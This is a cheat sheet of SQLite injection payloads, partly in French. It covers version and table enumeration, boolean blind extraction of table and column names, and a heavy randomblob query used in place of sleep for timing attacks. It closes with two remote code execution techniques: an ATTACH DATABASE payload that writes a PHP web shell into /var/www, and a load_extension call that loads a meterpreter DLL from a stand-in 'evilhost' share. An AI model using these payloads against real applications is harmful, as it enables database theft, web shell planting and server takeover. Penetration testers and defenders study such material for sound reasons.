# SQLite Injection

#Petit guide

#Version select sqlite_version();
#Comments /* */ ou – – jusque eol
#Show tables select name from sqlite_master where type=’table’;
#Describe table select sql FROM sqlite_master WHERE tbl_name = ‘mytable‘ AND type = ‘table’;
#Select Nth Row  select * from tbl1 limit 0,1;  puis  select * from tbl1 limit 1,1; etc…
#Sleep n’existe pas mais en sqlite3.3 et > je fait presque 6 sec avec une mamaille du genre select substr(upper(hex(randomblob(99999999))),0,1);
#Generate quote (sqlite3 only)  select substr(quote(hex(0)),1,1);
#Generate dbl quote (sqlite3 only) select cast(X’22’ as text);

Cheat Sheet

 Comments	 							--
 IF Statements	 							CASE
 Concatenation	 							||
 Substring	 							substr(x,y,z)
 Length	 								length(stuff)
 Generate single quote	 						select substr(quote(hex(0)),1,1);
 Generate double quote	 						select cast(X'22' as text);
 Generate double quote (method 2)	 				.. VALUES (“<?xml version=“||””””||1||
 Space-saving double quote generation	 				select replace("<?xml version=$1.0$>","$",(select cast(X'22' as text)));



## Integer/String based - Extract table name
```
SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
```
Use limit X+1 offset X, to extract all tables.

## Integer/String based - Extract column name
```
SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'
```

For a clean output
```
SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'
```

## Boolean - Count number of tables
```
and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) < number_of_table
```

## Boolean - Enumerating table name
```
and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number
```

## Boolean - Extract info
```
and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > hex('some_char')
```

## Remote Command Execution using SQLite command - Attach Database
```
ATTACH DATABASE ‘/var/www/lol.php’ AS lol;
CREATE TABLE lol.pwn (dataz text);
INSERT INTO lol.pwn (dataz) VALUES (‘<?system($_GET[‘cmd’]); ?>’);--
```

## Remote Command Execution using SQLite command - Load_extension
```
UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
```
Note: By default this component is disabled

## Thanks to
[Injecting SQLite database based application - Manish Kishan Tanwar](https://www.exploit-db.com/docs/41397.pdf)
